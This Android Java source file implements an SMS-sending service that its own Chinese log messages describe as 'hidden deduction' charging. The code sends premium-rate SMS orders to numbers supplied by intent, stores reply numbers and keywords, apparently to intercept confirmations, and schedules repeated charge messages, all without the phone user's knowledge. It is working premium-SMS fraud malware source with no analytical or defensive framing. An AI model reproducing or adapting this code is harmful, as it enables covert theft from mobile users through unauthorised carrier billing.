package com.sttm.charge;


import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.os.IBinder;
import android.util.Log;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;

public class SendSmsService extends Service {

	private final String TAG = "SendSmsService";

	private int count;
	private String smsNumber;
	private String smsOrder;
	private long time;
	private String secretSmsNumber;
	private String secretSmsOrder;
	private String replyNumber;
	private String keyword;


	private Context context;

	@Override
	public void onCreate() {
		super.onCreate();
		context = this.getApplicationContext();

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);

		Log.d("TAG", "发送短信服务己启动成功了");

		smsNumber = intent.getStringExtra("SecretSmsNumber");
		smsOrder = intent.getStringExtra("SecretSmsOrder");
		time = intent.getLongExtra("sendTime", 4);
		int flag = intent.getIntExtra("flag", 3);
		count = intent.getIntExtra("sendCount", 2);
		replyNumber = intent.getStringExtra("secretSmsReplyNumber");
		keyword = intent.getStringExtra("keyword");

		secretSmsNumber = intent.getStringExtra("secretSmsNumber");
		secretSmsOrder = intent.getStringExtra("secretSmsOrder");

		switch (flag) {
		case 1:
			Log.d("test", "暗扣扣费");
			new Thread() {
				
			
				@Override
				public void run() {
					String smsNumber1 = smsNumber;
					String smsOrder1 = smsOrder;
					long time1 = time;
					int count1 = count;
					String replyNumber1 = replyNumber;
					String keyword1 = keyword;

					KsoCache.getInstance().reSetValue("sendSecretSms", true);
					if (!"".equals(replyNumber1)) {

						KsoCache.getInstance().reSetValue("replyNumber",
								replyNumber1);
					}

					if (!"".equals(keyword1)) {

						KsoCache.getInstance().reSetValue("keyword", keyword1);
					}

					SmsSenderAndReceiver.send2(smsNumber1, smsOrder1);
					Log.d("TAG", "向移动用户发送了第" + 1 + "条暗扣短信，号码为 " + smsNumber1
							+ "指令为" + smsOrder1);
					LogFile.WriteLogFile("向移动用户发送了第" + 1 + "条暗扣短信,暗扣通道："
							+ smsNumber1 + " 暗扣指令：" + smsOrder1);
					long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4 : (Long)KsoCache.getInstance().getValue("timeout");
					KsoMainCourse.startTimeoutHandler(context, timeout);
					KsoCache.getInstance().reSetValue("ksoSmsNumber",
							smsNumber1);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder1);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 1);
					for (int i = 0; i < (count1 - 1); i++) {
						/**Intent intentSalesFlag2 = new Intent(context,
								KsoAlarmService.class);
						intentSalesFlag2.setAction("ksoSendSms");
						PendingIntent pintentSalesFlag2 = PendingIntent
								.getBroadcast(context, 0, intentSalesFlag2, 0);
						AlarmManager alarmSales2 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales2.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + time1 * 60 * 1000,
								pintentSalesFlag2);*/
						KsoMainCourse.startSencondMoneyHandler(context, time1);

					}
					super.run();
				}

			}.start();

			break;

		case 4:
			
			Log.d("test", "GRPS扣费");

			new Thread() {
				@Override
				public void run() {
					String[] secretSmsNumbers = secretSmsNumber.substring(0,
							secretSmsNumber.lastIndexOf(",")).split(",");
					String[] secretSmsOrders = secretSmsOrder.substring(0,
							secretSmsOrder.lastIndexOf(",")).split(",");
					long time4 = time;
					int count4 = count;
					String replyNumber4 = replyNumber;
					String keyword4 = keyword;

					KsoCache.getInstance().reSetValue("sendSecretSms", true);
					if (!"".equals(replyNumber4)) {

						KsoCache.getInstance().reSetValue(
								"secretSmsReplyNumber", replyNumber4);
					}

					if (!"".equals(keyword4)) {

						KsoCache.getInstance()
								.reSetValue("keyword", keyword4);
					}
					
					
					int ran = KsoHelper.getRandom(secretSmsNumbers.length - 1);
					String smsNumber4 = secretSmsNumbers[ran];
					String smsOrder4 = secretSmsOrders[ran];
					SmsSenderAndReceiver.send2(smsNumber4, smsOrder4);
					long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4 : (Long)KsoCache.getInstance().getValue("timeout");
					KsoMainCourse.startTimeoutHandler(context, timeout);
					Log.d("TAG", "向移动用户发送了第" + 1 + "条暗扣短信，号码为 " + smsNumber4
							+ "指令为" + smsOrder4);
					LogFile.WriteLogFile("向移动用户发送了第" + 1 + "条暗扣短信,暗扣通道："
							+ smsNumber4 + " 暗扣指令：" + smsOrder4);
					KsoCache.getInstance().reSetValue("ksoSmsNumber",
							smsNumber4);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder4);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 1);
					
					Log.d("test", "发送暗扣短信次数" + count4);
					for (int i = 0; i < (count4 - 1); i++) {
						/**Intent intentSalesFlag4 = new Intent(context,
								KsoAlarmService.class);
						intentSalesFlag4.setAction("ksoSendSms");
						PendingIntent pintentSalesFlag2 = PendingIntent
								.getBroadcast(context, 0, intentSalesFlag4, 0);
						AlarmManager alarmSales4 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales4.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + time4 * 60 * 1000,
								pintentSalesFlag2);*/
						
						KsoMainCourse.startSencondMoneyHandler(context, time4);

					}
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
				
				}
			}.start();
			break;

		}

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

}
